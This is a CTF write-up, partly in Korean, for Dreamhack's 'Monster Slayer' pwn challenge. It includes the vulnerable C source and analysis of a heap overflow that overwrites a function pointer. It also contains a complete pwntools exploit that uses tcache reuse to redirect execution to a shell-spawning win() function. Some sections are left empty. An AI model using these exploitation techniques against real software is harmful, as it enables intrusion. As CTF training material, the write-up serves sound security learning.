# Monster Slayer - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 2
- Provided Files: chall.c, chall(ELF)
- tools:
## Brief Description
Use your power to defeat the monster.
## Initial Analysis
### Environment
``` sh
checksec chall
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
### Code
``` c
// compile: gcc -o chall chall.c -no-pie -Wl,-z,relro,-z,now
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>

struct Character {
    char name[0x10];
    int64_t hp;
    uint64_t type;
    char profile[0x30];
    int (*skill)();
};

struct Monster {
    char name[0x10];
    int64_t hp;
    char info[0x30];
    int (*skill)();
};

// skill definitions
// warrior
int iron_cleave() {
    printf("Skill: Iron Cleave | Damage: 120\n");
    printf("Swing your blade in a brutal arc, cutting through all enemies in front of you.\n");
    return 120;
}

int crushing_charge() {
    printf("Skill: Crushing Charge | Damage: 90\n");
    printf("Rush forward with unstoppable force, slamming into enemies for heavy impact damage.\n");
    return 90;
}

int earth_splitter() {
    printf("Skill: Earth Splitter | Damage: 150\n");
    printf("Smash your weapon into the ground, sending a shockwave that rips through enemies.\n");
    return 150;
}

// mage
int arcane_surge() {
    printf("Skill: Arcane Surge | Damage: 115\n");
    printf("Blast a focused beam of unstable magic at a target for high burst damage.\n");
    return 115;
}

int hellfire_ring() {
    printf("Skill: Hellfire Ring | Damage: 100\n");
    printf("Summon a fiery ring around you that incinerates nearby enemies.\n");
    return 100;
}

int lightning_vortex() {
    printf("Skill: Lightning Vortex | Damage: 125\n");
    printf("Call down a chaotic storm of lightning bolts on a target area.\n");
    return 125;
}

// archer
int piercing_shot() {
    printf("Skill: Piercing Shot | Damage: 100\n");
    printf("Fire a high-velocity projectile that penetrates all enemies in a straight line.\n");
    return 100;
}

int rapid_barrage() {
    printf("Skill: Rapid Barrage | Damage: 130\n");
    printf("Unleash a burst of arrows in quick succession toward a single enemy.\n");
    return 130;
}

int explosive_bolt() {
    printf("Skill: Explosive Bolt | Damage: 115\n"); 
    printf("Shoot a special arrow that explodes on impact, damaging all nearby enemies.\n");
    return 115;
}

// monster
int claw_slash() {
    printf("Skill: Claw Slash | Damage: 100\n");
    printf("A swift, close-range attack using sharp claws to rend the enemy’s flesh.\n");
    return 100;
}

int poison_spit() {
    printf("Skill: Poison Spit | Damage: 90\n");
    printf("Spits a concentrated venom that deals strong instant damage to the enemy.\n");
    return 90;
}

int roaring_smash() {
    printf("Skill: Roaring Smash | Damage: 130\n"); 
    printf("Lets out a fierce roar and follows with a devastating smash dealing heavy damage.\n");
    return 130;
}


char monster_name[3][0x10] = {"Razorclaw", "Venomspitter", "Thunderjaw"};
char monster_info[3][0x30] = {
    "Slashes enemies fast with deadly claws.", 
    "Spits venom to inflict swift, toxic damage.",
    "Roars and smashes enemies with brutal force."
};

int (*warrior_skill[3])() = {iron_cleave, crushing_charge, earth_splitter};
int (*mage_skill[3])() = {arcane_surge, hellfire_ring, lightning_vortex};
int (*archer_skill[3])() = {piercing_shot, rapid_barrage, explosive_bolt};
int (*monster_skill[3])() = {claw_slash, poison_spit, roaring_smash};


void init() {
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    srand((unsigned int)time(NULL));
}

void title() {
    puts("The land is overrun by ruthless monsters.");
    puts("Only you can stand against the coming darkness.");
    puts("With your power, fight for the fate of all.\n");
}

void menu() {
    puts("[1] Create Character Slot");
    puts("[2] Generate Character");
    puts("[3] Delete Character");
    puts("[4] Generate Monster");
    puts("[5] Slay Monster");
    puts("[6] Exit Game");
}

int is_null(void** ptr) {
    return *ptr == NULL;
}

void generate_character(struct Character *c1) {
    if (!is_null(c1)) return;
    
    ssize_t len;

    printf("Character name: ");
    len = read(0, c1->name, 0x10);
    if (c1->name[len-1] == '\n') c1->name[len-1] = '\0';

    c1->type = rand() % 3;
    c1->hp = 200;

    printf("Character profile: ");
    len = read(0, c1->profile, 0x38);
    if (c1->profile[len-1] == '\n') c1->profile[len-1] = '\0';

    switch (c1->type) {
        case 0: c1->skill = warrior_skill[rand() % 3]; break;
        case 1: c1->skill = mage_skill[rand() % 3]; break;
        case 2: c1->skill = archer_skill[rand() % 3]; break;
    }

    puts("\nYour character info:");
    printf("Name: %s\n", c1->name);
    printf("HP: %d\n", c1->hp);
    printf("Role: %s\n", c1->type == 0 ? "Warrior" : c1->type == 1 ? "Mage" : "Archer");
    printf("Profile: %s\n", c1->profile);
    c1->skill();
    printf("\n");
    
}

void generate_monster(struct Monster *m1) {
    if (!is_null(m1)) return;

    int r = rand() % 3;

    strcpy(m1->name, monster_name[r]);
    m1->hp = 500;
    strcpy(m1->info, monster_info[r]);
    m1->skill = monster_skill[r];

    puts("\nMonster info:");
    printf("Name: %s\n", m1->name);
    printf("Info: %s\n", m1->info);
    printf("HP: %d\n", m1->hp);
    m1->skill();
    printf("\n");
}

void slay_monster(struct Character *c, struct Monster *m) {
    while (c->hp > 0 && m->hp > 0) {
        m->hp -= c->skill();
        if (m->hp < 0) m->hp = 0;
    
        printf("Your character attacked %s!\n", m->name);
        printf("%s HP: %d\n", c->name, c->hp);
        printf("%s HP: %d\n\n", m->name, m->hp);
        sleep(1);
    
        if (m->hp == 0) break;

        c->hp -= m->skill();
        if (c->hp < 0) c->hp = 0;
    
        printf("%s attacked your character!\n", m->name);
        printf("%s HP: %d\n", c->name, c->hp);
        printf("%s HP: %d\n\n", m->name, m->hp);
        sleep(1);
    }
    
    if (c->hp == 0) {
        printf("You lose\n\n");
        exit(0);
    } else {
        printf("You win!\n\n");
    }
}

void win() {    
    execve("/bin/sh", 0, 0);
}

int main() {
    int pos, slot;
    struct Character *c[3] = {0,};
    struct Monster *m = 0;
    
    init();
    title();
    
    while(1) {
        menu();
        printf(">> ");
        scanf("%d", &pos);

        if (pos == 6) exit(0);

        if (pos != 4) {
            printf("\n");
            printf("Choose your character slot(1~3): ");
            scanf("%d", &slot);

            if (slot < 1 || slot > 3) {
                printf("Invalid input!!\n");
                exit(0);
            }

            slot--;
        }

        switch(pos) {
            case 1:
                if (!c[slot]) {
                    c[slot] = malloc(sizeof(struct Character));
                    printf("Slot created success.\n");
                } else {
                    printf("You already have this slot!\n\n");
                }
                break;
            case 2:
                if (!c[slot]) {
                    printf("There is no slot!\n\n");
                } else {
                    generate_character(c[slot]);
                }
                break;
            case 3:
                if (!c[slot]) {
                    puts("There is no character in this slot!\n");
                } else {
                    free(c[slot]);
                    c[slot] = 0;
                    puts("Character deleted.\n");
                }
                break;
            case 4:
                if (!m) {
                    m = malloc(sizeof(struct Monster));
                }
                generate_monster(m);
                break;
            case 5:
                if (!m) {
                    puts("Generate a monster first.\n");
                } else if (c[slot] == 0 || is_null(c[slot])) {
                    puts("There is no character in this slot!\n");
                } else {
                    slay_monster(c[slot], m);
                }
                break;
            default:
                puts("Invalid selection.\n");
                break;
        }
    }

    return 0;
}
```
## Vulnerability
### BOF(Buffer Overflow)
``` c
printf("Character profile: ");
len = read(0, c1->profile, 0x38);
```
`charactet.profile` 크기는 `0x30`인 반면, `read`로 읽어오는 크기는 `0x38`로 `0x8` 만큼 BOF가 발생한다. 이를 통해 `character.skill` 8 byte를 덮어쓸 수 있다.  
### Use of Uninitialized Memory / Type Confusion
``` c

```
`malloc()` 후, 또는 `free()` 전에 메모리를 초기화 하지 않는다.  
### NULL Pointer Dereference??
``` c
int is_null(void** ptr) {
    return *ptr == NULL;
}
```
`is_null()`을 사용하는 로직을 보면, 원래 의도는 전달 받은 구조체(character, monster) 포인터가 NULL인지 확인하는 목적으로 생각되지만, 코드 작성을 잘못하여 해당 구조체의 `name`이 NULL인이 판단한다.  
## Exploit
### Strategy
BOF 취약점이 존재하여 `character.profile`을 입력할 때 `character.skill`을 덮어쓸 수 있지만, 덮어쓴 직후 skill을 바로 초기화 하므로 큰 의미가 없다. 
### Exploitation Steps
``` sh
$ strings ./chall | grep malloc

```
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
### payload
``` python
from pwn import *

p = remote('host1.dreamhack.games', 16078) 

win_addr = 0x0000000000401c42
target_info = b"Slashes enemies fast with deadly claws."
payload = b'A' * 0x28 + p64(win_addr)

def createSlot(slot) :
    p.sendlineafter(b'>> ', b'1') # pos
    p.sendlineafter(b'Choose your character slot(1~3): ', str(slot).encode()) # slot

def generateCharacter(slot) :
    p.sendlineafter(b'>> ', b'2') # pos
    p.sendlineafter(b'Choose your character slot(1~3): ', str(slot).encode()) # slot
    p.sendlineafter(b'Character name: ', b'good') # name
    p.sendlineafter(b'Character profile: ', payload) # profile

def deleteSlot(slot) :
    p.sendlineafter(b'>> ', b'3') # pos
    p.sendlineafter(b'Choose your character slot(1~3): ', str(slot).encode()) # slot

def generateMonster() :
    p.sendlineafter(b'>> ', b'4') # pos

def slayMonster() :
    p.sendlineafter(b'>> ', b'5')
    p.sendlineafter(b'Choose your character slot(1~3): ', b'1') # slot


# create Character slot
for i in range(1, 4) :
    createSlot(i)
    generateCharacter(i)

# delete slot
for i in range(1, 4) :
    deleteSlot(i) # tcache -> 3 -> 2 -> 1

# create monster
generateMonster() # allocated character's slot 3

# create Character slot
createSlot(1)

# slay monster
slayMonster()

# interactive
p.interactive()
```
